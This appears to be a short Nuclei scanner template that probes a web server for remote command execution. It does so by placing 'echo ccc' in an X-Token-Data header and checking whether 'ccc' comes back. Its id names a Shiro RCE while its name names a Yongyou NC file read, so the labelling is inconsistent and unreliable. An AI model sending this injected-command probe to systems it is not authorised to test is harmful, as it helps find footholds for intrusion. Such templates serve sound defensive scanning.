id: guns-shiro-rce

info:
  name: yongyou-nc-word-fileread
  author: m0be1
  severity: high

http:
  - raw:
      - |              
        GET / HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Cookie: 
        X-Token-Data: echo ccc
        Accept-Encoding: gzip

    matchers:     
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body,'ccc')" 